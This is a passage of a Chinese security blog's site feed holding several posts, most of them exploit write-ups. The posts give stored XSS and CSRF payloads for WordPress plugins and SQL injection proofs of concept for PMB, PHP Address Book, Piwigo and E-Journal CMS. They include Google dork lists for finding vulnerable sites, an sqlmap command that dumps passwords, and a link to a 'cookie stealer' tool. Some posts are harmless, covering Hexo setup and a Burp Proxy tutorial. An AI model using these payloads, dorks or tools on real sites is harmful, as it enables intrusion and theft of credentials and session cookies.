%&gt;</span>//如果是首页是使用配置文件中的keywords</div><div class="line">  <span class="tag">&lt;<span class="title">meta</span> <span class="attribute">name</span>=<span class="value">"keywords"</span> <span class="attribute">content</span>=<span class="value">"&lt;%= config.keywords %&gt;"</span>&gt;</span></div><div class="line"><span class="vbscript">&lt;% } %&gt;</span></div></pre></td></tr></table></figure>

<p>最后别忘了在hexo的_config.yml配置文件中添加keywords（不是主题的_config.yml文件），这里的keywords是显示首页的关键字<br>最后用GIT部署，如果没有效果则键入以下命令：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">rm -rf <span class="keyword">public</span></div><div class="line">hexo clean</div><div class="line">rm -rf .deploy</div><div class="line">hexo g</div><div class="line">hexo d</div></pre></td></tr></table></figure>

]]></content>
         
         
           
             
              <breadCrumb title="生活琐事" url="http://www.weshell.net/categories/%E7%94%9F%E6%B4%BB%E7%90%90%E4%BA%8B/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/WordPressUA-HeaderImage.html</loc>
    <lastmod>2015-01-04T10:48:08.000Z</lastmod>
    <data>
        <display>
        <title>WordPressUA-HeaderImage插件CSRF/XSS漏洞</title>
        <pubTime>2015-01-02T12:20:16.000Z</pubTime>
        
         <content><![CDATA[<h3 id="0"><span class="label label-danger">漏洞标题：WordPressUniqueArticleHeaderImage插件CSRF/XSS漏洞</span></h3>
<h3 id="1"><span class="label label-danger">受影响版本：WPUniqueArticleHeaderImage1.0</span></h3>
<h3 id="2"><span class="label label-danger">有无利用方法：是</span></h3>
<p><br></p>
<h3 id="利用代码[XSS]：">利用代码[XSS]：</h3>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">在插件设置页面添加图片标题，写入 "&gt;<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">alert(<span class="number">32</span>)</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span> "</div><div class="line">保存插件设置后，XSS脚本被执行，刷新后可以看源码，XSS被储存</div></pre></td></tr></table></figure>

<p><br></p>
<h3 id="利用代码[CSRF构造]">利用代码[CSRF构造]</h3>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="title">body</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="title">form</span> <span class="attribute">action</span>=<span class="value">"http://localhost/wordpress/wp-admin/options-general.php?page=wp-unique-article-header-image/wp-unique-header.php"</span> <span class="attribute">method</span>=<span class="value">"POST"</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"hidden"</span> <span class="attribute">name</span>=<span class="value">"setting"</span> <span class="attribute">value</span>=<span class="value">"true"</span> /&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"hidden"</span> <span class="attribute">name</span>=<span class="value">"gt_default_header"</span> <span class="attribute">value</span>=<span class="value">"csrf attack"</span> /&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"hidden"</span> <span class="attribute">name</span>=<span class="value">"gt_homepage_header"</span> <span class="attribute">value</span>=<span class="value">"hi"</span> /&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"hidden"</span> <span class="attribute">name</span>=<span class="value">"gt-header-option-submitted"</span> <span class="attribute">value</span>=<span class="value">"Save Settings » "</span> /&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"submit"</span> <span class="attribute">value</span>=<span class="value">"Submit request"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="title">form</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="title">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="title">html</span>&gt;</span></div></pre></td></tr></table></figure>

]]></content>
         
         
           
             
              <breadCrumb title="漏洞仓库" url="http://www.weshell.net/categories/%E6%BC%8F%E6%B4%9E%E4%BB%93%E5%BA%93/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/xss-tool-one.html</loc>
    <lastmod>2015-01-04T10:47:46.000Z</lastmod>
    <data>
        <display>
        <title>跨站脚本工具集</title>
        <pubTime>2015-01-01T02:17:16.000Z</pubTime>
        
         <content><![CDATA[<h2 id="介绍">介绍</h2>
<p>发现寻找XSS漏洞是一个很复杂以及消耗时间的任务，为了找到这些漏洞的位置，我们使用一大批的工具和技术。在这一章，我们探索那些作者在研究测试中发现的非常有价值的工具。</p>
<h2 id="Burp">Burp</h2>
<p>现代浏览器是为速度和效率而生的，这就意味着Web应用的安全评估就是一个很痛苦的任务，因为探究一个Web应用需要深层的分析，通常，为了测试一个应用，你想降低从服务器获得数据和发送数据到服务器的传输速度从而你可以阅读以及改变传输的数据。从而代理出现了。</p>
<p>在安全的早期，代理可以降低向外传输数据的链接速度，所以用户仅仅可以改变传输到服务器的数据；然而，这仅仅是分析Web应用的一部分。有时你非常应该改变接受的数据。例如，你想改变一个cookie使得它不使用Httponly或者移除一个Javascript功能。有时你想获得一个你浏览器发出的每一个请求的双向传输的细节。然后就出现了Burp Proxy(<a href="http://www.portswigger.net/burp/)（译者注：原文链接有误）" target="_blank" rel="external">http://www.portswigger.net/burp/)（译者注：原文链接有误）</a></p>
<p>Burp Proxy是一个叫做Burp Suit的用于Web渗透的Java工具的一部分，但是对于本书的目的，仅仅一个功能是尤其有用的，那就是代理。上手，你需要安装Java的运行环境，你可以从Java的官方网站下载。一旦安装成功，你在你的浏览器改变你的代理设置，使用localhost或者127.0.0.1端口为8080.<br>图2.1chrome的代理服务器设置<br><img src="http://bugorg.qiniudn.com/b1.png" alt="burp proxy"><br>图2.2 Burp Suit的主窗口<br><img src="http://bugorg.qiniudn.com/b2.png" alt="burp proxy"><br>一旦完成以上操作，你就可以启动Burp Proxy了，启动后是一个空白的窗口。 其中Intercept和Options窗口（是我们关注的最重要的窗口。首先，让我们来配置Burp Proxy来监控发送和接受的请求。在Options选项下取消勾选资源类型的限制，勾选Server Response拦截，以及取消勾选’text’作为一个content type。这样将会展示你链接的所有服务器的所有的数据。<br>图2.3 Burp Suit Proxy Options配置屏<br><img src="http://bugorg.qiniudn.com/b3.png" alt="burp proxy"><br>Note：这也是一种识别你系统里面的间谍软件的方法，因为当有任何数据在你的客户端北修改之后，它讲停止并且警告你。如果你想查看你安装了什么间谍软件，你应该对于所有的客户端进行坚挺，因为每一个需要通过代理去展示什么在使用它。<br> 一但完成配置，你应该可以上网并且观察到从主机传入或者传出的所有数据。这既允许你查看传输的数据又允许你在你认为合适的时候进行修改。当然，你进行的任何修改在被传输给浏览器后会影响你并且值影响你，然而，如果它可以关闭javascript的保护，这就可以被用来做一些罪恶的事情，像持续型XSS，通常由于客户端方面的保护它并不被允许。同样的，在Asynchronous Javascript and 　XML（AJAX）的时代，这个工具对于监视和修改双向的传输数据也是很有力的，同时关掉客户端产生的任何防止浏览器进行修改的保护。<br>图2.4 请求监听<br><img src="http://bugorg.qiniudn.com/b4.png" alt="burp proxy"><br>这也可以帮助移除一些有可能泄露给目标的信息，包括cookies， referrers或者其他一些不必须的信息，就如上图所示。另一个有用的特性是转换成16进制模式。特别是在你查看采用交替编码方式，像US-ASCII或者UTF-16.<br>在下面两幅图中，你可以看到，他们或者是不可见字符（null）或者是不在标准的ASCII码0-127的范围内而是在128-255的范围内。在这两种情况中，查看源文件将提供很少甚至无法提供他们采用的编码方法或者实施攻击所需要的特定字符集。（译者注：<a href="http://ha.ckers.org/weird/us-ascii.html网站已经被移除）" target="_blank" rel="external">http://ha.ckers.org/weird/us-ascii.html网站已经被移除）</a><br>图2.5 作为16进制监控（us-ascii）<br><img src="http://bugorg.qiniudn.com/b5.png" alt="burp proxy"><br>图2.6 作为16进制监控  (utf-16)<br><img src="http://bugorg.qiniudn.com/b6.png" alt="burp proxy"><br>Burp Proxy是迄今为止最有用的手动评估Web应用的安全工具之一。他不仅可以帮助我们发现明显的问题，如果你知道你的目标的话它也可以进行规则配置。例如，如果你想仅仅寻找XML文件来调试AJAX应用，就可以创建一个仅仅获取该信息的规则。</p>
<p>最后，Burp仅仅是在大量的可以实现部分或者更多的Burp的功能的软件之一，但是没有别的软件以这种方式工作或者 有Burp Suit这么强大的能力。Burp Suit是一个用来理解HHTP实际工作过程的学习工具。</p>
]]></content>
         
         
           
             
              <breadCrumb title="知识百科" url="http://www.weshell.net/categories/%E7%9F%A5%E8%AF%86%E7%99%BE%E7%A7%91/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/pmb-sql.html</loc>
    <lastmod>2015-01-03T11:37:56.000Z</lastmod>
    <data>
        <display>
        <title>PMB 4.1.3 SQL注入漏洞</title>
        <pubTime>2015-01-03T13:17:16.000Z</pubTime>
        
         <content><![CDATA[<h3 id="0"><span class="label label-danger">漏洞标题：PMB4.1.3SQL注入漏洞</span></h3>
<h3 id="1"><span class="label label-danger">受影响版本：PMB4.1.3</span></h3>
<h3 id="2"><span class="label label-danger">有无利用方法：是</span></h3>
<p><br></p>
<h3 id="利用代码：">利用代码：</h3>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">-==== POC ====-</div><div class="line">谷歌语法：inurl:opac_css</div><div class="line">http://localhost/[PMB_PATH]/catalog.php?categ=isbd&id=9 [SQLI]</div><div class="line">Using SQLMAP :</div><div class="line">./sqlmap.py -u "http://localhost/[PMB_PATH]/catalog.php?categ=isbd&id=9" -p id --headers="Cookie: [VALID_USER_COOKIE]" --passwords</div></pre></td></tr></table></figure>

]]></content>
         
         
           
             
              <breadCrumb title="漏洞仓库" url="http://www.weshell.net/categories/%E6%BC%8F%E6%B4%9E%E4%BB%93%E5%BA%93/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/Address-Book-SQL.html</loc>
    <lastmod>2015-01-03T11:36:36.000Z</lastmod>
    <data>
        <display>
        <title>PHP Address Book XSS/SQL注入漏洞</title>
        <pubTime>2015-01-03T13:17:16.000Z</pubTime>
        
         <content><![CDATA[<h3 id="0"><span class="label label-danger">漏洞标题：PHP-Address-Book-SQL注入漏洞</span></h3>
<h3 id="1"><span class="label label-danger">受影响版本：ALL</span></h3>
<h3 id="2"><span class="label label-danger">有无利用方法：是</span></h3>
<p><br></p>
<h3 id="利用代码[XSS]：">利用代码[XSS]：</h3>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://php-addressbook.sourceforge.net/demo/</div><div class="line">?group=customer<span class="tag">&lt;/<span class="title">option</span>&gt;</span><span class="tag">&lt;/<span class="title">select</span>&gt;</span><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">String</span>.fromCharCode(<span class="number">120</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">32</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">116</span>));</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>

<p><img src="http://i0yy.qiniudn.com/dhbyh4.jpg" alt="XSS构造"></p>
<h3 id="利用代码[SQL注入]">利用代码[SQL注入]</h3>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">-------------------</div><div class="line">if ($id) {</div><div class="line"></div><div class="line">   $sql = "SELECT * FROM $base_from_where AND $table.id='$id'";</div><div class="line">   $result = mysql_query($sql, $db);</div><div class="line">   $r = mysql_fetch_array($result);</div><div class="line"></div><div class="line">   $resultsnumber = mysql_numrows($result);</div><div class="line">}</div><div class="line">--------------------</div><div class="line">POC</div><div class="line">http://php-addressbook.sourceforge.net/demo/view.php?id=1337' union select 1,2,3,4,version(),6,database(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40--+</div><div class="line">&gt;</div><div class="line"><span class="tag">&lt;/<span class="title">html</span>&gt;</span></div></pre></td></tr></table></figure>



<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">username = ' or 1336%2B1=1337--%20</div><div class="line">password = any</div><div class="line">--------------------------------------------------------</div><div class="line">$urlun = strip_tags(substr($_REQUEST['username'],0,32));</div><div class="line"></div><div class="line">$urlpw = strip_tags(substr($_REQUEST['password'],0,32));</div><div class="line">$cleanpw = md5($urlpw);</div><div class="line"></div><div class="line">$sql="SELECT * FROM users WHERE username='$urlun' and password='$cleanpw'";</div></pre></td></tr></table></figure>

<p><img src="http://i0yy.qiniudn.com/2lncw3a.jpg" alt="SQL注入"></p>
]]></content>
         
         
           
             
              <breadCrumb title="漏洞仓库" url="http://www.weshell.net/categories/%E6%BC%8F%E6%B4%9E%E4%BB%93%E5%BA%93/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/Piwigo-SQL-xss.html</loc>
    <lastmod>2015-01-03T11:31:52.000Z</lastmod>
    <data>
        <display>
        <title>Piwigo SQL注入及跨站脚本漏洞</title>
        <pubTime>2015-01-03T13:17:16.000Z</pubTime>
        
         <content><![CDATA[<h3 id="0"><span class="label label-danger">漏洞标题：PiwigoSQL注入及跨站脚本漏洞</span></h3>
<h3 id="1"><span class="label label-danger">受影响版本：Piwigo2.7.2</span></h3>
<h3 id="2"><span class="label label-danger">有无利用方法：是</span></h3>
<p><br></p>
<h3 id="利用代码[XSS]：">利用代码[XSS]：</h3>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">fieldset</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">legend</span>&gt;</span>Add Group<span class="tag">&lt;/<span class="title">legend</span>&gt;</span><span class="tag">&lt;<span class="title">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">strong</span>&gt;</span>Name Group<span class="tag">&lt;/<span class="title">strong</span>&gt;</span><span class="tag">&lt;<span class="title">br</span>&gt;</span></div><div class="line">YOUR GROUP NAME O POC</div><div class="line"><span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"text"</span> <span class="attribute">size</span>=<span class="value">"20"</span> <span class="attribute">maxlength</span>=<span class="value">"50"</span> <span class="attribute">name</span>=<span class="value">"groupname"</span>&gt;</span><span class="tag">&lt;/<span class="title">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">p</span> <span class="attribute">class</span>=<span class="value">"actionButtons"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"submit"</span> <span class="attribute">value</span>=<span class="value">"Add"</span> <span class="attribute">name</span>=<span class="value">"submit_add"</span> <span class="attribute">class</span>=<span class="value">"submit"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">a</span> <span class="attribute">id</span>=<span class="value">"addGroupClose"</span> <span class="attribute">href</span>=<span class="value">"#"</span>&gt;</span>Cancel<span class="tag">&lt;/<span class="title">a</span>&gt;</span><span class="tag">&lt;/<span class="title">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"hidden"</span> <span class="attribute">value</span>=<span class="value">"24322c55681c00da423a8a7b21b79640"</span> <span class="attribute">name</span>=<span class="value">"pwg_token"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="title">fieldset</span>&gt;</span></div><div class="line"></div><div class="line">#P0c</div><div class="line">"&gt;<span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">x</span> <span class="attribute">onerror</span>=<span class="value">prompt(1);</span>&gt;</span></div></pre></td></tr></table></figure>

<p><img src="http://i0yy.qiniudn.com/qFyJz6q.jpg" alt="XSS测试"></p>
<h3 id="利用代码[SQL注入]">利用代码[SQL注入]</h3>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">#P0c</div><div class="line">http://site.com/piwigo/admin.php?page=history&search_id=5'</div><div class="line"></div><div class="line">SELECT</div><div class="line">    date,</div><div class="line">    time,</div><div class="line">    user_id,</div><div class="line">    IP,</div><div class="line">    section,</div><div class="line">    category_id,</div><div class="line">    tag_ids,</div><div class="line">    image_id,</div><div class="line">    image_type</div><div class="line">  FROM ucea_history</div><div class="line">  WHERE </div><div class="line">; in /home/site.com/public_html/piwigo/include/dblayer/functions_mysqli.inc.php on line 830</div></pre></td></tr></table></figure>

<p><img src="http://i0yy.qiniudn.com/wpzMmmu.jpg" alt="SQL注入测试"></p>
]]></content>
         
         
           
             
              <breadCrumb title="漏洞仓库" url="http://www.weshell.net/categories/%E6%BC%8F%E6%B4%9E%E4%BB%93%E5%BA%93/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/Lazarus%20-Guestbook%20.html</loc>
    <lastmod>2015-01-03T11:07:18.000Z</lastmod>
    <data>
        <display>
        <title>Lazarus Guestbook 1.22 XSS/SQL注入漏洞</title>
        <pubTime>2015-01-03T13:17:16.000Z</pubTime>
        
         <content><![CDATA[<h3 id="0"><span class="label label-danger">漏洞标题：LazarusGuestbook1.22XSS/SQL注入漏洞</span></h3>
<h3 id="1"><span class="label label-danger">受影响版本：LazarusGuestbook1.22</span></h3>
<h3 id="2"><span class="label label-danger">有无利用方法：是</span></h3>
<p><br></p>
<h3 id="利用代码：">利用代码：</h3>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">#P0c [1]: Get into code xss in the ad block box</div><div class="line"><span class="tag">&lt;<span class="title">textarea</span> <span class="attribute">class</span>=<span class="value">"input"</span> <span class="attribute">id</span>=<span class="value">"ad_code"</span> <span class="attribute">name</span>=<span class="value">"ad_code"</span> <span class="attribute">wrap</span>=<span class="value">"virtual"</span> <span class="attribute">rows</span>=<span class="value">"14"</span> <span class="attribute">cols</span>=<span class="value">"41"</span>&gt;</span>CODE XSS<span class="tag">&lt;/<span class="title">textarea</span>&gt;</span></div><div class="line"></div><div class="line">#P0c [2]: Get into code xss in the smile name box</div><div class="line"><span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"text"</span> <span class="attribute">size</span>=<span class="value">"25"</span> <span class="attribute">value</span>=<span class="value">"CODE XSS"</span> <span class="attribute">name</span>=<span class="value">"s_emotion"</span>&gt;</span></div><div class="line"></div><div class="line">#P0c [3]: Get into code xss in the font style box</div><div class="line"><span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"text"</span> <span class="attribute">class</span>=<span class="value">"input"</span> <span class="attribute">maxlength</span>=<span class="value">"70"</span> <span class="attribute">size</span>=<span class="value">"38"</span> <span class="attribute">value</span>=<span class="value">"CODE XSS"</span> <span class="attribute">name</span>=<span class="value">"font_face"</span>&gt;</span></div><div class="line"></div><div class="line">#P0c [4]: Get into code xss in the security box</div><div class="line"><span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"text"</span> <span class="attribute">class</span>=<span class="value">"input"</span> <span class="attribute">value</span>=<span class="value">"CODE XSS"</span> <span class="attribute">size</span>=<span class="value">"29"</span> <span class="attribute">name</span>=<span class="value">"comment_pass"</span>&gt;</span></div><div class="line"></div><div class="line">#P0c [5]: Get into code xss in the email notification box</div><div class="line"><span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"text"</span> <span class="attribute">class</span>=<span class="value">"input"</span> <span class="attribute">maxlength</span>=<span class="value">"60"</span> <span class="attribute">size</span>=<span class="value">"30"</span> <span class="attribute">value</span>=<span class="value">"CODE XSS"</span> <span class="attribute">name</span>=<span class="value">"book_mail"</span>&gt;</span></div><div class="line"></div><div class="line">#P0c [6]: Get into code xss in the tags box</div><div class="line"><span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"text"</span> <span class="attribute">class</span>=<span class="value">"input"</span> <span class="attribute">maxlength</span>=<span class="value">"60"</span> <span class="attribute">size</span>=<span class="value">"30"</span> <span class="attribute">value</span>=<span class="value">"CODE XSS"</span> <span class="attribute">name</span>=<span class="value">"allowed_tags"</span>&gt;</span></div></pre></td></tr></table></figure>

<p><img src="http://i0yy.qiniudn.com/JESZTCz.jpg" alt="SQL注入漏洞"></p>
]]></content>
         
         
           
             
              <breadCrumb title="漏洞仓库" url="http://www.weshell.net/categories/%E6%BC%8F%E6%B4%9E%E4%BB%93%E5%BA%93/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/E-Journal%20-CMS-SQL%20.html</loc>
    <lastmod>2015-01-03T11:06:48.000Z</lastmod>
    <data>
        <display>
        <title>E-Journal CMS SQL注入漏洞</title>
        <pubTime>2015-01-03T13:17:16.000Z</pubTime>
        
         <content><![CDATA[<h3 id="0"><span class="label label-danger">漏洞标题：E-Journal-CMS-SQL注入漏洞</span></h3>
<h3 id="1"><span class="label label-danger">受影响版本：ALL</span></h3>
<h3 id="2"><span class="label label-danger">有无利用方法：是</span></h3>
<p><br></p>
<h3 id="利用代码[XSS]：">利用代码[XSS]：</h3>
<p>谷歌利用：<br>inurl:mahasiswa.php intitle:E-Journal<br>inurl:dosen.php intitle:E-Journal<br>inurl:jurnal.php intitle:E-Journal<br>inurl:dokumen.php intitle:E-Journal<br>“Karya Tulis Mahasiswa” intitle:E-Journal<br>“Design &amp; Programming by” intitle:E-Journal<br>“E-Journal adalah aplikasi berbasis web untuk” </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">POC#1: SQL Injection </div><div class="line">http://[Site]/[Path]/jurnal.php?detail=jurnal&id=-'[SQL-INJECTION VULNERABILITY]--</div><div class="line"> </div><div class="line">Reference Url(s): </div><div class="line">http://e-journal.xxx.ac.id/jurnal.php?detail=jurnal&id='133[SQL-INJECTION VULNERABILITY]--</div><div class="line">http://www.ejournal-xxx.com/jurnal.php?detail=jurnal&id='133[SQL-INJECTION VULNERABILITY]--</div><div class="line">http://e-journal.xxx.ac.id/jurnal.php?detail=jurnal&id='133[SQL-INJECTION VULNERABILITY]--</div><div class="line">http://ejurnal.xxx.ac.id/jurnal.php?detail=jurnal&id='133[SQL-INJECTION VULNERABILITY]--</div><div class="line">http://ejournal.xxx.ac.id/jurnal.php?detail=jurnal&id='133[SQL-INJECTION VULNERABILITY]--</div></pre></td></tr></table></figure>

]]></content>
         
         
           
             
              <breadCrumb title="漏洞仓库" url="http://www.weshell.net/categories/%E6%BC%8F%E6%B4%9E%E4%BB%93%E5%BA%93/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/cookie-manager.html</loc>
    <lastmod>2015-01-03T10:07:06.000Z</lastmod>
    <data>
        <display>
        <title>Cookie Manager 0.5 [cookie小偷]</title>
        <pubTime>2015-01-03T02:17:16.000Z</pubTime>
        
         <content><![CDATA[<p>大家都懂的，构建完XSS后需要一个东西来收集cookie，<br>没有错这个就是php版的工具，源码已经打包<br>自行下载<br><a href="http://packetstorm.wowhacker.com/web/CookieStealer.zip" rel="external" target="_blank">撸这里下载</a></p>
]]></content>
         
         
           
             
              <breadCrumb title="神兵利器" url="http://www.weshell.net/categories/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8/"/>
          
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/hello-world.html</loc>
    <lastmod>2015-01-03T04:06:16.000Z</lastmod>
    <data>
        <display>
        <title>Hello World</title>
        <pubTime>2015-01-03T08:23:17.000Z</pubTime>
        
         <content><![CDATA[<p>Welcome to <a href="http://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="http://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="http://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">trobuleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
<h2 id="Quick_Start">Quick Start</h2>
<h3 id="Create_a_new_post">Create a new post</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>

<p>More info: <a href="http://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
<h3 id="Run_server">Run server</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>

<p>More info: <a href="http://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
<h3 id="Generate_static_files">Generate static files</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>

<p>More info: <a href="http://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
<h3 id="Deploy_to_remote_sites">Deploy to remote sites</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>

<p>More info: <a href="http://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
]]></content>
         
         
           
        </display>
    </data>
    </url>

    
  <url>
    <loc>http://www.weshell.net/WordPress-gSlideShow.html</loc>
    <lastmod>2015-01-02T14:03:56.000Z</lastmod>
    <data>
        <display>
        <title>WordPressgSlideShow插件CSRF/XSS漏洞</title>
        <pubTime>2015-01-02T13:17:16.000Z</pubTime>
        
         <content><![CDATA[<h3 id="0"><span class="label label-danger">漏洞标题：WordPressUniqueArticleHeaderImage插件CSRF/XSS漏洞</span></h3>
<h3 id="1"><span class="label label-danger">受影响版本：WPUniqueArticleHeaderImage1.0</span></h3>
<h3 id="2"><span class="label label-danger">有无利用方法：是</span></h3>
<p><br></p>
<h3 id="利用代码[XSS]：">利用代码[XSS]：</h3>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">进入gSlideshow设置页面</div><div class="line">输入框内写入："&gt;<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">alert(<span class="number">32</span>)</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div><div class="line">保存刷新页面，可以看见XSS被储存</div></pre></td></tr></table></figure>

<p><br></p>
<h3 id="利用代码[CSRF构造]">利用代码[CSRF构造]</h3>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="title">body</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="title">form</span> <span class="attribute">action</span>=<span class="value">"http://localhost/wordpress/wp-admin/options-general.php?page=gslideshow.php"</span> <span class="attribute">method</span>=<span class="value">"POST"</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"hidden"</span> <span class="attribute">name</span>=<span class="value">"rss"</span> <span class="attribute">value</span>=<span class="value">"csrf baby"</span> /&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"hidden"</span> <span class="attribute">name</span>=<span class="value">"display_time"</span> <span class="attribute">value</span>=<span class="value">"500"</span> /&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="title">input</span> 